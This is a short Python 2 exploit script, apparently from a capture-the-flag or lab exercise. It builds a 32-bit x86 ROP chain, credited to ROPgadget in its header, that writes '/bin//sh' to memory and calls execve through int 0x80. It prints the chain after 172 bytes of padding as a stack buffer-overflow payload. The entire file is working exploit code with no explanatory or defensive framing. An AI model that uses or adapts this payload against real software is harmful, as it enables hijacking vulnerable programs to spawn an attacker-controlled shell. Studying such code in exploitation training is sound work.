#!/usr/bin/env python2
# execve generated by ROPgadget
from struct import pack
# Padding goes here
p = ''
p += pack('<I', 0xf7e15aa6) # pop edx ; ret
p += pack('<I', 0xf7fc4040) # @ .data
p += pack('<I', 0xf7e37f97) # pop eax ; ret
p += '/bin'
p += pack('<I', 0xf7e7f34b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xf7e15aa6) # pop edx ; ret
p += pack('<I', 0xf7fc4044) # @ .data + 4
p += pack('<I', 0xf7e37f97) # pop eax ; ret
p += '//sh'
p += pack('<I', 0xf7e7f34b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xf7e15aa6) # pop edx ; ret
p += pack('<I', 0xf7fc4048) # @ .data + 8
p += pack('<I', 0xf7e405fc) # xor eax, eax ; ret
p += pack('<I', 0xf7e7f34b) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0xf7e2c395) # pop ebx ; ret
p += pack('<I', 0xf7fc4040) # @ .data
p += pack('<I', 0xf7ec8047) # pop ecx ; ret
p += pack('<I', 0xf7fc4048) # @ .data + 8
p += pack('<I', 0xf7e15aa6) # pop edx ; ret
p += pack('<I', 0xf7fc4048) # @ .data + 8
p += pack('<I', 0xf7e405fc) # xor eax, eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e1beec) # inc eax ; ret
p += pack('<I', 0xf7e16c87) # int 0x80

def main():
    payload = "A"*172 + p
    print(payload)

if __name__ == "__main__":
    main()
